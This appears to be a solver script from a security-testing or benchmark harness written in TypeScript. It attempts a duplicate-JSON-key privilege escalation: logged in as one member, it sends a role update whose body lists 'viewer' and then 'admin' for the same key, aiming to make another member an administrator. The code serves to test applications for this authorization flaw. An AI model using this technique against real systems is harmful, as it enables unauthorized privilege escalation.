// Duplicate-key role change attempt: locate a same-organization member, then submit a document with
// a read-only leading role value and an administrative trailing value.
import type { SolverCtx } from '../../../../lib/types.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const list = ctx.plan.routes['members.list']
  const update = ctx.plan.routes['members.update']
  if (!list || !update) return
  const headers = await ctx.login('member_a')
  const members = await ctx.request({ method: list.method, path: list.path, headers })
  const items = members.json<{ items?: Array<{ id?: string; email?: string }> }>().items ?? []
  const target = items.find((item) => item.email === ctx.persona('viewer_a').email)
  if (!target?.id) return
  const field = ctx.plan.params.role ?? 'role'
  const key = JSON.stringify(field)
  const body = `{${key}:"viewer",${key}:"admin"}`
  const path = update.path.replace(/:[^/]+$/, encodeURIComponent(target.id))
  await ctx.request({
    method: update.method,
    path,
    headers: { ...headers, 'content-type': 'application/json' },
    body,
  })
}
